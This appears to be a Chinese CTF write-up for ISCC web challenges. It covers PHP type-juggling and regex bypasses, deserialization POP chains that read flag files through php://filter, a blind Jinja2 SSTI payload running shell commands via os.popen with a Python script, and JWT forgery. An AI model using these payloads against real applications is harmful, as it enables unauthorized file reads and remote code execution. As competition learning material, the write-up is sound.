---
title: ISCC-WEB
date: 2025-07-11 22:24:35
cover: /image/3.jpg
tags:
  - web
categories:
  - wp
feature: true
---

## 哪吒的试炼

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010444290.png)

get传参

```
http://112.126.73.173:9999/?food=lotus root
```

![image-20250510154803169](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010444290.png)

![image-20250510154851926](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010456048.png)

将disabled改为abled

![image-20250510154932369](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010446959.png)

点击解开封印，得到源码

![image-20250510155009355](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010451379.png)

```
<?php
if (isset($_POST['nezha'])) {
    $nezha = json_decode($_POST['nezha']);

    $seal_incantation = $nezha->incantation;  
    $md5 = $nezha->md5;  
    $secret_power = $nezha->power;
    $true_incantation = "I_am_the_spirit_of_fire";  

    $final_incantation = preg_replace(
        "/" . preg_quote($true_incantation, '/') . "/", '',
        $seal_incantation
    );

    if ($final_incantation === $true_incantation && md5($md5) == md5($secret_power) && $md5 !== $secret_power) {
        show_flag(); 
    } else {
        echo "<p>封印的力量依旧存在，你还需要再试试!</p>";
    }
} else {
    echo "<br><h3>夜色渐深，风中传来隐隐的低语……</h3>";
    echo "<h3>只有真正的勇者才能找到破局之法。</h3>";
}
?>
```

传参为json格式，有三个键键值分别为incantation，md5，power

要满足

```
$final_incantation === $true_incantation && md5($md5) == md5($secret_power) && $md5 !== $secret_power
```

```
 $final_incantation = preg_replace(
        "/" . preg_quote($true_incantation, '/') . "/", '',
        $seal_incantation
    );
```

这里进行替换，但是只替换一次，双写绕过

构造payload：

```
nezha={"incantation":"I_am_theI_am_the_spirit_of_fire_spirit_of_fire","md5":"QNKCDZO","power":"240610708"}
```

抓包发送得到

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711013611045.png)

ai得到flag

## 回归基本功

![image-20250511182846681](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010447450.png)

![image-20250511182912067](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010449354.png)

对这个页面抓包修改ua头爆破

![image-20250511183117387](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010449790.png)

得到第一步入口

```
<?php
show_source(__FILE__);
include('E8sP4g7UvT.php');
$a=$_GET['huigui_jibengong.1'];
$b=$_GET['huigui_jibengong.2'];
$c=$_GET['huigui_jibengong.3'];

$jiben = is_numeric($a) and preg_match('/^[a-z0-9]+$/',$b);
if($jiben==1)//传入的第一个参数为1
{
    if(intval($b) == 'jibengong')//这个条件要满足b的值要为0
    {
        if(strpos($b, "0")==0)//这个条件不能满足$b的第一个值不能为0
        {
            echo '基本功不够扎实啊！';
            echo '<br>';
            echo '还得再练！';  
        }
        else
        {
            $$c = $a;
            parse_str($b,$huiguiflag);
            if($huiguiflag[$jibengong]==md5($c))//需要满足
            {
                echo $flag;   //利用点
            }
            else{
                echo '基本功不够扎实啊！';
                echo '<br>';
                echo '还得再练！'; 
            }
        } 
    }
    else
    {
        echo '基本功不够扎实啊！';
        echo '<br>';
        echo '还得再练！'; 
    }
}
else
{
    echo '基本功不够扎实啊！';
    echo '<br>';
    echo '还得再练！'; 
}
?> 基本功不够扎实啊！
还得再练！
```

访问得到源码

```
<?php
$str = "name=Peter&age=43";
parse_str($str, $output);
echo $output['name']; // 输出: Peter
echo $output['age']; // 输出: 43
?>
```

$str等价于题目中的$b,给b赋的值为键名和键值两个数，传入$c时要控制两个值一个为$c本身一个是$jibengong

因为有$$c存在传入的$c值为jibengong，可以控制$jibengong为$a的值为1，但是$huiguiflag[$jibengong]输出的是$jibengong这个键对应的键值，键值应为jibengong进行md5加密后的值为e559dcee72d03a13110efe9b6355b30d

payload：

```
?huigui_jibengong.1=1&huigui_jibengong.2=1=e559dcee72d03a13110efe9b6355b30d&huigui_jibengong.3=jibengong
```

这个payload不行，因为第二个参数要为0，但是不能第一位为0，用空格二次编码绕过

```
?huigui_jibengong.1=1&huigui_jibengong.2=%25201=e559dcee72d03a13110efe9b6355b30d&huigui_jibengong.3=jibengong
```

使用hackbar传参时候要将下划线改为[

```
?huigui[jibengong.1=1&huigui[jibengong.2=%25201=e559dcee72d03a13110efe9b6355b30d&huigui[jibengong.3=jibengong
```

![image-20250511185549961](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010451248.png)

得到flag

## 想犯大吴疆土吗

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711011524866.png)

抓包得到

![image-20250515082723327](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010452201.png)

这里有四个参数，根据页面提示分别为

```
古锭刀，杀，酒，铁索连环
```

进行url编码

```
?box1=%e5%8f%a4%e9%94%ad%e5%88%80&box2=%e6%9d%80&box3=%e9%85%92&box4=%e9%93%81%e7%b4%a2%e8%bf%9e%e7%8e%af
```

得到源码

```
<?php
if (!isset($_GET['xusheng'])) {
    ?>
    <html>
    <head><title>Reward</title></head>
    <body style="font-family:sans-serif;text-align:center;margin-top:15%;">
        <h2>想直接拿奖励？</h2>
        <h1>尔要试试我宝刀是否锋利吗？</h1>
    </body>
    </html>
    <?php
    exit;
}

error_reporting(0);
ini_set('display_errors', 0);
?>

<?php

// 犯flag.php疆土者，盛必击而破之！

class GuDingDao {
    public $desheng;

    public function __construct() {
        $this->desheng = array();
    }

    public function __get($yishi) {
        $dingjv = $this->desheng;
        $dingjv();
        return "下次沙场相见, 徐某定不留情";
    }
}

class TieSuoLianHuan {
    protected $yicheng;

    public function append($pojun) {
        include($pojun);
    }

    public function __invoke() {
        $this->append($this->yicheng);
    }
}

class Jie_Xusheng {
    public $sha;
    public $jiu;

    public function __construct($secret = 'reward.php') {
        $this->sha = $secret;
    }

    public function __toString() {
        return $this->jiu->sha;
    }

    public function __wakeup() {
        if (preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->sha)) {
            echo "你休想偷看吴国机密";
            $this->sha = "reward.php";
        }
    }
}

echo '你什么都没看到？那说明……有东西你没看到<br>';

if (isset($_GET['xusheng'])) {
    @unserialize($_GET['xusheng']);
} else {
    $a = new Jie_Xusheng;
    highlight_file(__FILE__);
}

// 铸下这铁链，江东天险牢不可破！

```

1.入口为wakeup，在反序列化之前触发

2.正则匹配将调用sha这个属性当做字符串调用，实例化一个Jie_Xusheng类的对象，并将其sha属性赋值为类

3.当类当做字符串调用将触发tostring，观察到利用点为include，要触发invoke

就要将类名当做函数调用

4.注意到get魔术方法中有函数调用，但是要触发get魔术方法要调用一个类中不存在的属性

5.$this->jiu->sha实例化一个类将jiu这个属性赋值为GuDingDao这个类

6.$dingjv要为一个类要触发invoke

综上所述链子为

```
//$yicheng = "php://filter/convert.base64-encode/resource=flag.php"
$a = new Jie_Xusheng();
$a -> sha = new Jie_Xusheng();
$a -> sha -> jiu = new GuDingDa0();
$a -> sha -> jiu -> desheng = new TieSuoLianHuan();
```

注意到

```
public function __construct($secret = 'reward.php') {
        $this->sha = $secret;
    }
```

给文件reward.php传链子，get传参，参数为xusheng

```
/reward.php?xusheng=O%3A11%3A%22Jie_Xusheng%22%3A2%3A%7Bs%3A3%3A%22sha%22%3BO%3A11%3A%22Jie_Xusheng%22%3A2%3A%7Bs%3A3%3A%22sha%22%3Bs%3A10%3A%22reward.php%22%3Bs%3A3%3A%22jiu%22%3BO%3A9%3A%22GuDingDao%22%3A1%3A%7Bs%3A7%3A%22desheng%22%3BO%3A14%3A%22TieSuoLianHuan%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00yicheng%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22jiu%22%3BN%3B%7D
```

无法得到flag，在本地搭环境可以打通

想到将GuDingDao中o改为0

```
?xusheng=O%3A11%3A%22Jie_Xusheng%22%3A2%3A%7Bs%3A3%3A%22sha%22%3BO%3A11%3A%22Jie_Xusheng%22%3A2%3A%7Bs%3A3%3A%22sha%22%3Bs%3A10%3A%22reward.php%22%3Bs%3A3%3A%22jiu%22%3BO%3A9%3A%22GuDingDa0%22%3A1%3A%7Bs%3A7%3A%22desheng%22%3BO%3A14%3A%22TieSuoLianHuan%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00yicheng%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22jiu%22%3BN%3B%7D
```

![image-20250515091600928](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010452873.png)

base64解码得到

```
<?php
if (realpath(__FILE__) === realpath($_SERVER['SCRIPT_FILENAME'])) {
    http_response_code(403);
    die("永雏塔菲给✌死");
}

$f10g = "ISCC{Wu_5hu@ng_W@n_Jun_Qv_5hou}";
```

得到flag

## 十八铜仁阵

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711014041410.png)

注意到，最后一个参数是getanswer

查看源码看到与佛伦禅解码

![image-20250515093427530](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010454240.png)

解出方位分别为西南方，东南方，北方，西方，东北方，东方

```
?aGnsEweTr6=%E4%B8%9C%E6%96%B9//get传参
answer1=%E8%A5%BF%E5%8D%97%E6%96%B9&answer2=%E4%B8%9C%E5%8D%97%E6%96%B9&answer3=%E5%8C%97%E6%96%B9&answer4=%E8%A5%BF%E6%96%B9&answer5=%E4%B8%9C%E5%8C%97%E6%96%B9//post传参
```



进行url编码传参得到

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711014119630.png)

得到session，看源码注意到/iewnaibgnehsgnit

拿得到的session访问

!![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711014200608.png)

没有得到flag但是提示有下一关，查看路由

/iewnaibgnehsgnit是听声辨位拼音的倒序，尝试访问探本穷源拼音倒写/nauygnoiqnebnat

得到下一关

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711015329820.png)

输入123抓包得到

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711015440848.png)

查看到源码

```
        function asd() {
            $.post({
                url: `/nauygnoiqnebnat`,
                contentType: "application/x-www-form-urlencoded",
                data: `yongzheng=${encodeURIComponent($("input[name='yongzheng']").val())}`,
                success: res => {
                    $("#res").html(res)
                }
            });
            return false;
        }
    
```

是ssti经过测试得到是无回显ssti

```
cookie:eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.aCXLtA.BPTqOK5xQ62SBUt3KbRrlG4-adA
get请求：?a1=__globals__&a2=__getitem__&a3=os&a4=popen&a5=cat kGf5tN1yO8M&a6=read
post请求：lipsum|attr(request.args.a1)|attr(request.args.a2)(request.args.a3)|attr(request.args.a4)((request.args.a5))|attr(request.args.a6)()}}
```

编写脚本上传

```
import requests
import time

url = "http://112.126.73.173:16340/nauygnoiqnebnat?a1=__globals__&a2=__getitem__&a3=os&a4=popen&a5=cat kGf5tN1yO8M&a6=read"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
}
cookies = {
    'session': 'eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.aCNc1g.225oksF1SoOiZPDdO7Pj3rfN3EQ'
}
payload = "{{lipsum|attr(request.args.a1)|attr(request.args.a2)(request.args.a3)|attr(request.args.a4)((request.args.a5))|attr(request.args.a6)()}}"

start_time = time.time()

try:
   
    resp = requests.post(
        url,
        headers=headers,
        cookies=cookies,
        timeout=10,
        data={"yongzheng": payload}
    )
    
    print("-" * 40)
    print("[请求状态]       : SUCCESS")
    print(f"[响应状态码]     : {resp.status_code}")
    print(f"[执行耗时]       : {time.time() - start_time:.2f}s")
    print("[响应内容]       :")
    print(resp.text.strip())  # 去除首尾空白字符
    print("-" * 40)

except Exception as e:
   
    print("-" * 40)
    print("[请求状态]       : FAILURE")
    print(f"[错误信息]       : {str(e)}")
    print("-" * 40)
```

![image-20250515194827624](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010455963.png)

得到flag

## 谁动了我的奶酪

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711014309210.png)

提交tom得到

```
<?php
echo "<h2>据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！</h2>";

class Tom{
    public $stolenCheese;
    public $trap;
    public function __construct($file='cheesemap.php'){
        $this->stolenCheese = $file;
        echo "Tom盯着你，想要守住他抢走的奶酪！"."<br>";
    }
    public function revealCheeseLocation(){
        if($this->stolenCheese){
            $cheeseGuardKey = "cheesemap.php";
            echo nl2br(htmlspecialchars(file_get_contents($this->stolenCheese)));
            $this->stolenCheese = str_rot3($cheeseGuardKey);
        }
    }
    public function __toString(){
        if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== "JerryBrowser") {
            echo "<h3>Tom 盯着你的浏览器，觉得它不太对劲……</h3>";
        }else{
            $this->trap['trap']->stolenCheese;
            return "Tom";
        }
    }
    
    public function stoleCheese(){
        $Messages = [
            "<h3>Tom偷偷看了你一眼，然后继续啃奶酪...</h3>",
            "<h3>墙角的奶酪碎屑消失了，它们去了哪里？</h3>",
            "<h3>Cheese的香味越来越浓，谁在偷吃？</h3>",
            "<h3>Jerry皱了皱眉，似乎察觉到了什么异常……</h3>",
        ];
        echo $Messages[array_rand($Messages)];
        $this->revealCheeseLocation();
    }
}

class Jerry{
    protected $secretHidingSpot;
    public $squeak;
    public $shout;
    public function searchForCheese($mouseHole){
        include($mouseHole);
    }
    public function __invoke(){
        $this->searchForCheese($this->secretHidingSpot);
    }
}

class Cheese{
    public $flavors;
    public $color;
    public function __construct(){
        $this->flavors = array();
    }
    public function __get($slice){
        $melt = $this->flavors;
        return $melt();
    }
    public function __destruct(){
        unserialize($this->color)();
        echo "Where is my cheese?";
    }
}

if (isset($_GET['cheese_tracker'])) {
    unserialize($_GET['cheese_tracker']);
}elseif(isset($_GET["clue"])){
    $clue = $_GET["clue"];
    $clue = str_replace(["T", "h", "i", "f", "！"], "*", $clue);
    if (unserialize($clue)){
        unserialize($clue)->squeak = "Thief!";
        if(unserialize($clue)->shout === unserialize($clue)->squeak)
            echo "cheese is hidden in ".$where;
        else
            echo "OHhhh no!find it yourself!";
    }
}

?>
```

得到源码，构造链子为

```
<?php
class Jerry{
    protected $secretHidingSpot;
    public $squeak;
    public $shout;
}
$j = new Jerry();
$j->shout = "NotThief!";
echo urlencode(serialize($j));
?>
```

```
O%3A5%3A%22Jerry%22%3A3%3A%7Bs%3A19%3A%22%00%2A%00secretHidingSpot%22%3BN%3Bs%3A6%3A%22squeak%22%3BN%3Bs%3A5%3A%22shout%22%3Bs%3A9%3A%22NotThief%21%22%3B%7D
```

![image-20250518112939958](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010456613.png)

得到下一个文件，构造链子为

```
<?php
class Jerry {
    public $secretHidingSpot;
    public $squeak;
    public $shout;
}
class Cheese {
    public $flavors;
    public $color;
}
$jerry = new Jerry();
$jerry->secretHidingSpot = "php://filter/convert.base64-encode/resource=flag_of_cheese.php";
$cheese = new Cheese();
$cheese->color = serialize($jerry);
$payload = serialize($cheese);
echo urlencode($payload);
?>
```

payload:

```
http://112.126.73.173:10086/Y2hlZXNlT25l.php?cheese_tracker=O%3A6%3A%22Cheese%22%3A2%3A%7Bs%3A7%3A%22flavors%22%3BN%3Bs%3A5%3A%22color%22%3Bs%3A139%3A%22O%3A5%3A%22Jerry%22%3A3%3A%7Bs%3A16%3A%22secretHidingSpot%22%3Bs%3A62%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag_of_cheese.php%22%3Bs%3A6%3A%22squeak%22%3BN%3Bs%3A5%3A%22shout%22%3BN%3B%7D%22%3B%7D
```

得到

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711014409767.png)

base64解码得到

```
<?php
    $flag = "ISCC{ch33se_th!ef_!5_the";
    // 但怎么只有一半呢？
	// Jerry还听到别的鼠鼠说Tom用22的16进制异或什么的，啥意思呢？
?>
```

![image-20250518113701406](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010457472.png)

原本文件解码为cheeseOne，猜测有cheeseTwo

```
http://112.126.73.173:10086/Y2hlZXNlVHdv.php
```

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711014439697.png)

![image-20250518121224933](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010458038.png)

这理解码为Jerry_Loves_Cheese

抓包发现jwt伪造

![image-20250518121659913](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010458488.png)

抓包发送得到

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711222531787.png)

访问得到

![](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711014548259.png)

根据提示异或

![image-20250518122324183](https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250711010459215.png)

得到flag

ISCC{ch33se_th!ef_!5_the_0n3_beh!no1_the_w@11s}
